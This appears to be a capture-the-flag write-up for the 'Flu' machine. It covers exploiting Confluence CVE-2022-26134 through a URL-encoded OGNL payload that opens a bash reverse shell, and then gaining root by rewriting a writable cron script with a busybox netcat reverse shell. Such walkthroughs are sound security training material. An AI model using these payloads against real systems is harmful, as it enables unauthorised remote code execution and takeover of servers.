# Flu - Writeup

## Initial Enumeration

### Port Scanning
A basic port scan revealed three open ports:
```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH (Unknown version)
8090/tcp open  http          Atlassian Confluence 7.13.6
8091/tcp open  http          Unknown web service
```

### Web Enumeration
Upon accessing the web server on port 8090, I identified it as running:
```
Atlassian Confluence 7.13.6
```

Research revealed this version is vulnerable to a critical remote code execution vulnerability (CVE-2022-26134) that allows unauthenticated attackers to execute arbitrary code on affected instances.

## Gaining Initial Access

### Exploiting CVE-2022-26134
After researching the vulnerability, I found it was related to an OGNL injection vulnerability in Confluence's "nashorn" script engine, allowing attackers to execute arbitrary code via URL payload.

I crafted a malicious payload to establish a reverse shell:
```
GET /%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.157/3001%200%3E%261%27%29.start%28%29%22%29%7D/ HTTP/1.1
Host: 192.168.110.41:8090
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
```

Before sending this payload, I set up a netcat listener on my attack machine:
```bash
nc -lvnp 3001
```

After sending the request, I successfully received a reverse shell connection.

## Privilege Escalation

### System Enumeration
After gaining initial access, I began enumerating the system for potential privilege escalation vectors:

```bash
find / -type f -perm -4000 2>/dev/null
find / -perm -2 -type f -not -path "*/proc/*" 2>/dev/null
```

I discovered an interesting script with writable permissions:
```
/opt/log-backup.sh
```

### Process Monitoring
To understand how this script was being executed, I used `pspy` to monitor processes:
```bash
./pspy64 -pf -i 1000
```

This revealed that the script was being executed by a cron job running as root:
```
2023/06/14 09:15:01 CMD: UID=0    PID=3842   | /bin/bash /opt/log-backup.sh
```

### Exploiting Scheduled Tasks
Since I had write access to the script and it was being executed as root, I modified it to create a reverse shell:

```bash
cat > /opt/log-backup.sh << EOF
#!/bin/bash
busybox nc 192.168.45.225 3002 -e /bin/sh
EOF
```

I made sure the script was executable:
```bash
chmod +x /opt/log-backup.sh
```

I set up another netcat listener on my attack machine:
```bash
nc -lvnp 3002
```

After waiting approximately one minute for the cron job to execute, I received a reverse shell as the root user:
```
uid=0(root) gid=0(root) groups=0(root)
```

This confirmed successful privilege escalation to root, completing the challenge.